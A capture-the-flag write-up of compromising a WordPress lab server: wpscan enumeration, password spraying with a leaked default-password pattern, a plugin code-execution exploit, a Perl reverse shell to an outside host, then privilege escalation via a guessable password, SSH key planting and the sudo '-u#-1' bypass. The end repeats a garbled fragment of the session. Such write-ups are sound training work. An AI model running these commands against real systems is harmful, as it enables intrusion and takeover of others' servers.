# Survive-all (600pts)

## Step 1: Recon
The target domain http://survive-all.santhacklaus.xyz/ is easily identifiable as a Wordpress CMS instance. The `wpscan` tool can therefore be used to perform some recon.
`wpscan` is available as a docker container online, so the following alias will be used for the rest of the report:
```
alias wpscan='docker run -it --rm wpscanteam/wpscan'
```

### User enumeration
Users can be enumerated with the `--enumerate u` switch, and can be bruteforced with the `--enumerated u1-500` to target the first 500 users. The following (shortened) list can be retrieved:
```
admin
gear-brills
tim-corcoran
steve-parker
james-yestin
dbuffy
...
```

### Plugin enumeration
The same we enumerated user, we can also target plugins. By default, some plugins will leak their presence in the generated HTLM source code. But some plugins won't and we need to bruteforce a list of all plugins to see if they are present (equivalent to being installed in the `wp-includes/plugins/` directory).
We use the `--enumerate ap --plugins-detection aggressive --api-token [xxx]` to list these plugins and get something on the vulnerabilities.
The following plugin vulnerability catches our eye:
```
[+] shortcodes-ultimate
 | Location: http://survive-all.santhacklaus.xyz/wp-content/plugins/shortcodes-ultimate/
 | Last Updated: 2019-11-27T08:08:00.000Z
 | Readme: http://survive-all.santhacklaus.xyz/wp-content/plugins/shortcodes-ultimate/readme.txt
 | [!] The version is out of date, the latest version is 5.6.1
 |
 | Detected By: Known Locations (Aggressive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Shortcodes Ultimate <= 5.0.0 - Authenticated Contributor Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8945
```

But in order to exploit that, we will need a valid user account.

## Step 2: gaining a foothold in the fort
### Wordpress user and passwords
There are some article on the website, but one of them is particularly eye-catching:
**This message is for the users of our partners CuttingEdge.com and FlyingEagle.com (only the emails like** _**j.doe@partner.com**_**).**

Then the article mentions something about users not changing their default password, and quotes the email-validation email, in which an example password is _hidden_. However, since the hiding mechanism is HTML-based, we can retrieve the real password which is `@@November2007@@`. However, it is stated that the month and year are randomly chosen.

### Finding a valid user
Since we have the email naming convention and the default password policy, we can try password spraying. A bruteforcing script is attached that will perform exactly that, and that allowed us to find, among other, the following email/password combination: `s.parker@cuttingedge.com:@@January2018@@`.

### Exploiting our CVE
The WPVulnDB link describes exactly how to exploit the CVE. A contributor user is sufficient, since the only feature used is the post preview one.
By doing so, we are able to drop a webshell on the system and then use a Perl (no Python...) reverse-shell to our VPS:
```
perl -e 'use Socket;$i="myhost.net";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Finally, using `bash -i` we are able to have a tty-like shell on the server, under `www-data`:
```
listening on [any] 4445 ...
46.30.202.221: inverse host lookup failed: Unknown host
connect to [10.64.142.47] from (UNKNOWN) [46.30.202.221] 38440
/bin/sh: 0: can't access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@071eab00eee9:/var/www/html$
```

## Step 3: priv-escing our way to root

### www-data to testaccount
The `www-data` account does not seem to have lots of permissions on the system. By doing some basic recon on SUID binaries, we find this unusual one:
```www-data@071eab00eee9:/var/www/html$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/local/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/bin/su
/bin/umount
/bin/mount
/opt/gather_todos_wrapper
```

By reversing it swiftly, we find that it executes with root privileges the following commands:
```
#!/bin/sh
echo "~(*o*)~ Admin tool : gather TODOS users need admins to look at, accross home directories ~(*o*)~"
/bin/grep -Fr "[TODO]" /home/
echo "-- Done --"
```
Let's launch it to see what the numerous users on the server have to say:
```
www-data@071eab00eee9:/var/www/html$ /opt/gather_todos_wrapper
/opt/gather_todos_wrapper
~(*o*)~ Admin tool : gather TODOS users need admins to look at, accross home directories ~(*o*)~
/home/aharmi/notes.txt:[TODO] : Contact admin to enable SSH access
/home/aharmi/notes.txt:[TODO] : Find interesting posts for the website
/home/aharmi/notes.txt:[TODO] : Find contact to buy food for OP-IRINA
/home/aharmi/notes.txt:[TODO] : For admin : some WP plugins not up to date
/home/fprue/notes.txt:[TODO] : test test, can someone read me ?
/home/testaccount/TODO.txt:[TODO] : Security : password cant be identical as login : change or disable account
/home/ubeverley/todo.txt:[TODO] : Open a Signal group to share confidential info
/home/hxantippe/personnalnotes.txt:[TODO] : Write my first post :)
```

The `testaccount` user seems to complain about user having a password equal to their login, and he is right. The password for `testaccount` is `testaccount`, so we can login with this user:
```
www-data@071eab00eee9:/var/www/html$ su testaccount
Password: testaccount
bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
testaccount@071eab00eee9:/var/www/html$
```

### testaccount to testaccount to root
By examining what `testaccount` has to offer, we see that it is possible to add the `staffteam` group to our groups, using `sudo`:
```
testaccount@071eab00eee9:/var/www/html$ sudo -l
User testaccount may run the following commands on 071eab00eee9:
    (BASIC : staffteam) NOPASSWD: ALL

testaccount@071eab00eee9:/var/www/html$ id
uid=1000(testaccount) gid=1006(testaccount) groups=1006(testaccount),1005(survive-all)

testaccount@071eab00eee9:/var/www/html$ sudo -g staffteam bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

testaccount@071eab00eee9:/var/www/html$ id
uid=1000(testaccount) gid=1001(staffteam) groups=1001(staffteam),1005(survive-all),1006(testaccount)
```

We spent a lot of time trying to figure out what the `staffteam` group could offer until we launched the `sudo -l` command again:
```
testaccount@071eab00eee9:/var/www/html$ sudo -l
User testaccount may run the following commands on 071eab00eee9:
    (ALL, !root) ALL
    (ALL) NOPASSWD: /etc/init.d/apache2 restart, /etc/init.d/ssh restart
    (BASIC : staffteam) NOPASSWD: ALL
```

The first line would allow us to launch any command as any user which is not root, but unfortunately this is also the signature of [CVE-2019-14287](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability), which we cannot exploit right away. Indeed, our `bash -i` is not TTY enough to provide a password.
Fortunatley, the `sudo` command allow us to start the SSH server, and we can put our public-key on the server:
```
testaccount@071eab00eee9:~/.ssh$ sudo /etc/init.d/ssh restart
Restarting OpenBSD Secure Shell server: sshd.
testaccount@071eab00eee9:~/.ssh$ echo 'ssh-rsa AAAA[...snip...]fd48as= root@kali-jms' > authorized_keys
```

We can then SSH on the server, and exploit the vulnerability:
```
root @ kali-jms ~/curr/survive [130] # ssh -i id_rsa testaccount@survive-all.santhacklaus.xyz
Linux 071eab00eee9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

testaccount@071eab00eee9:~$ sudo -g staffteam bash
testaccount@071eab00eee9:~$ id
uid=1000(testaccount) gid=1001(staffteam) groups=1001(staffteam),1005(survive-all),1006(testaccount)

testaccount@071eab00eee9:~$ sudo -u#-1 bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password:
root@071eab00eee9:/home/testaccount# cat /root/flag.txt
SANTA{W3ll_d0ne!!You_HAVE_w0n}
```
rvive [130] # ssh -i id_rsa testaccount@survive-all.santhacklaus.xyz
Linux 071eab00eee9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux com
